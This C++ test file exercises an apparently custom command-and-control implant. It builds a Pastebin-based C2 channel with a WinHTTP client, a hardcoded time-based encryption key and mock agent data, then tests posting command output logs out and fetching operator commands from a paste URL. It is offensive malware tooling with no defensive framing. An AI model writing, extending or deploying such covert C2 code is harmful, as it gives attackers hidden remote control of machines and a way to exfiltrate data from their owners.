#include "modules/c2/comm.h"
#include "modules/c2/crypto.h"
#include "modules/c2/pastebin.h"
#include "modules/c2/protocol.h"
#include <iostream>
#include <cassert>
#include <thread>
#include <chrono>

int main() {
    // 1. Initialize Components
    Comm comm(L"Crux/1.0");
    time_based_encoder encoder("secret_key_123", 30); 
    pastebin_c2 c2(&comm, &encoder);

#ifdef DEBUG
    comm.SetDebugBypass(true); // Bypass proxy for local testing
#endif

    if (!comm.Initialize()) {
        std::cerr << "Failed to initialize WinHTTP" << std::endl;
        return 1;
    }

    // 2. Create a Mock Log Batch
    LogBatch logs;
    logs.agent_id = "agent_007";
    logs.timestamp = std::time(nullptr);
    
    CommandResult result;
    result.task_id = "cmd_001";
    result.status = "success";
    result.output = "User: Admin";
    logs.results.push_back(result);

    // 3. Test Post Logs (Mock)
    std::cout << "Testing Post Logs..." << std::endl;
    std::string response = c2.post_logs(logs);
    std::cout << "Post Logs executed." << std::endl;

    // 4. Test Fetch Commands (Mock)
    // This part is tricky without a real server posting encrypted JSON.
    // We will manually encrypt a command batch and mock the fetch if possible,
    // but since fetch_data does the network call, we can only test that it runs without crashing
    // or use a mock Comm class (advanced).
    // For now, we assume the network call fails or returns garbage, and we handle the JSON error gracefully.
    
    std::cout << "Testing Fetch Commands..." << std::endl;
    CommandBatch cmds = c2.fetch_commands(L"/raw/dummy_cmds");
    
    if (cmds.commands.empty()) {
        std::cout << "Fetch Commands returned empty (Expected with dummy URL)" << std::endl;
    }

    return 0;
}
